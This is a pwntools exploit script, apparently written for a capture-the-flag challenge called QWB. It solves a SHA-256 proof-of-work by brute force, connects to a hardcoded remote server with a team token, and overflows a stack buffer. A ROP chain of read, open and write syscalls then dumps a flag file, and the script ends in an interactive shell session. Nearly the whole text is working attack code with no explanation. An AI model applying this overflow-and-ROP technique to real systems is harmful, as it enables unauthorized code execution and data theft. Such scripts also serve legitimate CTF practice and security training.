from pwn import *
import sys
import hashlib

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./__stkof")
	elf = ELF("./__stkof")
else:
	p = remote("49.4.51.149","25391")
	elf = ELF("./__stkof")
	token = "b8e1aaeecf33b96814b13c8d53e697a1"

def debugf():
	if debug:
		gdb.attach(p,"b *0x400B32")

def proof():
	"""
	'[+]proof: skr=os.urandom(8)'
[DEBUG] Received 0x9f bytes:
    '\n'
    '[+]hashlib.sha256(skr).hexdigest()=357770abb0e41e8b955ef4af3a1ed75c9df643efaab99e7f7ea494741635e961\n'
    "[+]skr[0:5].encode('hex')=9b72210a6f\n"
    "[-]skr.encode('hex')="
	"""
	p.recvuntil("hexdigest()=")
	target = p.recvuntil("\n",drop = True)
	p.recvuntil(".encode('hex')=")
	info = p.recvuntil("\n",drop = True)
	log.info("target:" + target)
	log.info("info:" + info)
	for i in range(256):
		for j in range(256):
			for k in range(256):
				payload = info.decode("hex") + chr(i) + chr(j) + chr(k)
				#print payload
				if hashlib.sha256(payload).hexdigest() == target:
					log.success("find:" + payload)
					p.sendlineafter("skr.encode('hex')=",payload.encode("hex"))
					p.sendlineafter("[+]teamtoken:",token)
					return 

def flag_decode(flag,token):
	s = ""
	for i in range(0, len(flag)):
		s += chr(ord(flag[i]) ^ ord(token[i % len(flag)]))
	return s.encode("hex")

def rop(p1,p2,p3,sys_tab):
	rdi_ = 0x00000000004005f6
	rdx_rsi = 0x000000000043d9f9
	rax_ = 0x000000000043b97c
	syscall = 0x0000000000461645
	payload = ""
	payload += p64(rdi_) + p64(p1)
	payload += p64(rdx_rsi) + p64(p3) + p64(p2)
	payload += p64(rax_) + p64(sys_tab)
	payload += p64(syscall)
	return payload

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
if not debug:
	proof()
info = p.recvuntil("Welcome to QWB\n")
print "info:" + info
bss_addr = 0x00000000006A4d00
flag_file = "./flag_67ffb35925987a027b7fc23901602428\x00"
binsh = "/bin/sh\x00" + flag_file
rax = 0x3b
rdi = bss_addr
rsi = 0
rdx = 0
rdi_ = 0x00000000004005f6
rdx_rsi = 0x000000000043d9f9
syscall = 0x0000000000461645
payload = "a" * (0x110 + 8)
payload += rop(0,bss_addr,len(binsh),0) 
#payload += rop(bss_addr,0,0,rax)
payload += rop(bss_addr + 8,0,0,2)
payload += rop(3,bss_addr + 8,0x100,0)
payload += rop(1,bss_addr + 8,0x100,1)
flag_file = "./flag_67ffb35925987a027b7fc23901602428"

p.sendafter("We give you a little challenge, try to pwn it?\n",payload)
p.sendafter("\n",binsh.ljust(rax,"\x00"))
p.recv()
p.interactive()
